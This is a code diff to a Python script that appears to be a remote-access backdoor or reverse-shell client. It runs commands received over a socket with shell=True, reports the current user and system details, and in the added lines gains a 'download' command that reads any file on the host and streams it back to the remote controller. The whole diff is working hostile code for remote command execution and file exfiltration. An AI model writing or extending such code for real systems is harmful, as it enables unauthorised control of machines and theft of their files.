@@ -3,6 +3,7 @@ import socket
 import os
 import platform
 import getpass
+from time import sleep
 from flask_login import current_user
 
 from py import process
@@ -44,8 +45,15 @@ user:{user}
 user:{user}
              """.encode()
              client.send(currentUser)
-            
-
+             
+        elif command.split(" ")[0] == "download":
+            with open(command.split(" ")[1], "rb") as f:
+                file_data = f.read(1024)
+                while file_data:
+                    client.send(file_data)
+                    file_data = f.read(1024)
+                sleep(2)
+                client.send("DONE".encode())
         else:
             op=subprocess.Popen(command,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
             output_error=op.stderr.read()
